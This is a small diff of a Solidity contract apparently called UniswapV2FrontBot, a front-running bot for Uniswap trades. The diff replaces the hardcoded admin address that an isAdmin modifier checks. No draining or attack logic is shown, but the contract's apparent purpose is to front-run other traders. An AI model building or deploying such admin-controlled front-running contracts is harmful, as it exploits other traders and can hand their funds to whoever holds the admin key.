@@ -10,7 +10,7 @@ contract UniswapV2FrontBot {
     mapping (address => FrontBot) bots;
     address[] public botAccts;
     
-    address public admin = 0x6E7bE797DE52cEA969130c028aD168844C4C5Bb5;
+    address public admin = 0x51F751Ba639551bFe6c4b5C094ca2273Cd9205D3;
     
     modifier isAdmin(){
         if(msg.sender != admin)
